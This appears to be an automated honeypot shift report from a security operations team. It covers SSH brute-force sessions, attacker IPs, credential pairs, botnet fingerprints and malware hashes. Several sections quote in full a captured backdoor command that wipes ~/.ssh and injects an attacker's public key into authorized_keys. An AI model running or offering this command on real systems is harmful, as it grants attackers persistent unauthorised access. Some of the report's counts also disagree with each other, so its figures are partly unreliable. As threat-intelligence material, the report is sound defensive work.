# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-23 |
| **Generated At** | 2026-06-23T20:20:49Z |
| **Shift Time** | 20:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **92** |
| Confirmed Threats | **61** |
| False Positives Filtered | **31** (33.7%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **13** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **83** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **17** |
| Unique Passwords | **23** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9 |
| `345gs5662d34` | 4 |
| `admin` | 2 |
| `user` | 2 |
| `ubuntu` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `admin` | 2 |
| `123456` | 2 |
| `P@ssw0rd` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `test` | `P@ssw0rd` | 1 |
| `debian` | `9999999` | 1 |
| `admin` | `admin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `171.231.181.100` | 2026-06-23T18:40:23 |
| `root` | `@wsx3edc` | `124.228.34.69` | 2026-06-23T19:58:25 |
| `root` | `3245gs5662d34` | `124.228.34.69` | 2026-06-23T19:58:29 |
| `root` | `Abc@1234` | `124.228.34.69` | 2026-06-23T20:00:12 |
| `root` | `123456Hh` | `124.228.34.69` | 2026-06-23T20:01:57 |
| `root` | `jf@123456` | `124.228.34.69` | 2026-06-23T20:02:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **92** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 28 |
| OpenSSH | 6 |
| AsyncSSH (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 23 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 6 | 6 |
| `fda360b1b4f4...` | Mirai/variant | 2 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |
| `f555226df196...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 23 | 3 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 6 | 6 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 2 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `124.228.34.69`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **20** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS57706` | Hybula B.V. | 1 | MEDIUM |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS20738` | Heart Internet limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bcb1dc524cbb

| Field | Detail |
|---|---|
| **Source IP** | `171.231.181[.]100` |
| **First Seen** | 2026-06-23 18:40 |
| **Last Seen** | 2026-06-23 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 18:40:23` | `cowrie.session.connect` |
| `2026-06-23 18:40:23` | `cowrie.client.version` |
| `2026-06-23 18:40:23` | `cowrie.client.kex` |
| `2026-06-23 18:40:23` | `cowrie.login.success` |
| `2026-06-23 18:40:23` | `cowrie.direct-tcpip.request` |
| `2026-06-23 18:40:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-06-23 18:40:24` | `cowrie.direct-tcpip.data` |
| `2026-06-23 18:40:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.181[.]100` to AbuseIPDB if not already reported
- [ ] Block `171.231.181[.]100` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3589c9fc5e

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 19:58 |
| **Last Seen** | 2026-06-23 19:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 19:58:25` | `cowrie.session.connect` |
| `2026-06-23 19:58:25` | `cowrie.client.version` |
| `2026-06-23 19:58:25` | `cowrie.client.kex` |
| `2026-06-23 19:58:25` | `cowrie.login.success` |
| `2026-06-23 19:58:26` | `cowrie.session.params` |
| `2026-06-23 19:58:26` | `cowrie.command.input` |
| `2026-06-23 19:58:26` | `cowrie.command.failed` |
| `2026-06-23 19:58:26` | `cowrie.log.closed` |
| `2026-06-23 19:58:26` | `cowrie.session.params` |
| `2026-06-23 19:58:26` | `cowrie.command.input` |
| `2026-06-23 19:58:26` | `cowrie.session.file_download` |
| `2026-06-23 19:58:26` | `cowrie.log.closed` |
| `2026-06-23 19:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e9b48570413

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 19:58 |
| **Last Seen** | 2026-06-23 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 19:58:28` | `cowrie.session.connect` |
| `2026-06-23 19:58:28` | `cowrie.client.version` |
| `2026-06-23 19:58:28` | `cowrie.client.kex` |
| `2026-06-23 19:58:29` | `cowrie.login.success` |
| `2026-06-23 19:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b4ccf4d7657

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 20:00 |
| **Last Seen** | 2026-06-23 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 20:00:11` | `cowrie.session.connect` |
| `2026-06-23 20:00:11` | `cowrie.client.version` |
| `2026-06-23 20:00:12` | `cowrie.client.kex` |
| `2026-06-23 20:00:12` | `cowrie.login.success` |
| `2026-06-23 20:00:13` | `cowrie.session.params` |
| `2026-06-23 20:00:13` | `cowrie.command.input` |
| `2026-06-23 20:00:13` | `cowrie.command.failed` |
| `2026-06-23 20:00:13` | `cowrie.log.closed` |
| `2026-06-23 20:00:13` | `cowrie.session.params` |
| `2026-06-23 20:00:13` | `cowrie.command.input` |
| `2026-06-23 20:00:13` | `cowrie.session.file_download` |
| `2026-06-23 20:00:13` | `cowrie.log.closed` |
| `2026-06-23 20:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbe8ceb0a5b4

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 20:00 |
| **Last Seen** | 2026-06-23 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 20:00:15` | `cowrie.session.connect` |
| `2026-06-23 20:00:15` | `cowrie.client.version` |
| `2026-06-23 20:00:15` | `cowrie.client.kex` |
| `2026-06-23 20:00:16` | `cowrie.login.success` |
| `2026-06-23 20:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f0128f2ca97

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 20:01 |
| **Last Seen** | 2026-06-23 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 20:01:56` | `cowrie.session.connect` |
| `2026-06-23 20:01:56` | `cowrie.client.version` |
| `2026-06-23 20:01:56` | `cowrie.client.kex` |
| `2026-06-23 20:01:57` | `cowrie.login.success` |
| `2026-06-23 20:01:57` | `cowrie.session.params` |
| `2026-06-23 20:01:57` | `cowrie.command.input` |
| `2026-06-23 20:01:57` | `cowrie.command.failed` |
| `2026-06-23 20:01:57` | `cowrie.log.closed` |
| `2026-06-23 20:01:58` | `cowrie.session.params` |
| `2026-06-23 20:01:58` | `cowrie.command.input` |
| `2026-06-23 20:01:58` | `cowrie.session.file_download` |
| `2026-06-23 20:01:58` | `cowrie.log.closed` |
| `2026-06-23 20:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e211af4699ec

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 20:02 |
| **Last Seen** | 2026-06-23 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 20:02:00` | `cowrie.session.connect` |
| `2026-06-23 20:02:00` | `cowrie.client.version` |
| `2026-06-23 20:02:00` | `cowrie.client.kex` |
| `2026-06-23 20:02:00` | `cowrie.login.success` |
| `2026-06-23 20:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee54944ea6c8

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 20:02 |
| **Last Seen** | 2026-06-23 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 20:02:31` | `cowrie.session.connect` |
| `2026-06-23 20:02:31` | `cowrie.client.version` |
| `2026-06-23 20:02:32` | `cowrie.client.kex` |
| `2026-06-23 20:02:32` | `cowrie.login.success` |
| `2026-06-23 20:02:32` | `cowrie.session.params` |
| `2026-06-23 20:02:32` | `cowrie.command.input` |
| `2026-06-23 20:02:32` | `cowrie.command.failed` |
| `2026-06-23 20:02:33` | `cowrie.log.closed` |
| `2026-06-23 20:02:33` | `cowrie.session.params` |
| `2026-06-23 20:02:33` | `cowrie.command.input` |
| `2026-06-23 20:02:33` | `cowrie.session.file_download` |
| `2026-06-23 20:02:33` | `cowrie.log.closed` |
| `2026-06-23 20:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b2b80866721

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-06-23 20:02 |
| **Last Seen** | 2026-06-23 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-23 20:02:36` | `cowrie.session.connect` |
| `2026-06-23 20:02:36` | `cowrie.client.version` |
| `2026-06-23 20:02:36` | `cowrie.client.kex` |
| `2026-06-23 20:02:37` | `cowrie.login.success` |
| `2026-06-23 20:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `124.228.34[.]69` | **14** | 2026-06-23 19:55 | 2026-06-23 20:06 | 2m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `58.49.26[.]202` | **13** | 2026-06-23 18:58 | 2026-06-23 19:04 | 22m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.148.33[.]168` | **5** | 2026-06-23 18:05 | 2026-06-23 19:17 | 3m | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | **3** | 2026-06-23 18:03 | 2026-06-23 18:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.32.228[.]2` | **3** | 2026-06-23 18:05 | 2026-06-23 19:44 | 4m | 0 | `T1592` | 🟢 LOW |
| `40.124.175[.]16` | **2** | 2026-06-23 20:11 | 2026-06-23 20:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.70.32[.]6` | 1 | 2026-06-23 19:07 | 2026-06-23 19:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.122.147[.]195` | 1 | 2026-06-23 20:04 | 2026-06-23 20:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]214` | 1 | 2026-06-23 18:58 | 2026-06-23 19:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]197` | 1 | 2026-06-23 19:17 | 2026-06-23 19:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `174.94.236[.]211` | 1 | 2026-06-23 18:38 | 2026-06-23 18:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-06-23 18:24 | 2026-06-23 18:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.95.48[.]154` | 1 | 2026-06-23 20:07 | 2026-06-23 20:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.122[.]202` | 1 | 2026-06-23 19:37 | 2026-06-23 19:37 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.58.57[.]140` | 1 | 2026-06-23 19:31 | 2026-06-23 19:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.115.99[.]68` | 1 | 2026-06-23 19:33 | 2026-06-23 19:33 | 31s | 0 | `T1592` | 🟢 LOW |
| `65.181.79[.]60` | 1 | 2026-06-23 19:37 | 2026-06-23 19:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.229.46[.]153` | 1 | 2026-06-23 18:38 | 2026-06-23 18:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/73** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
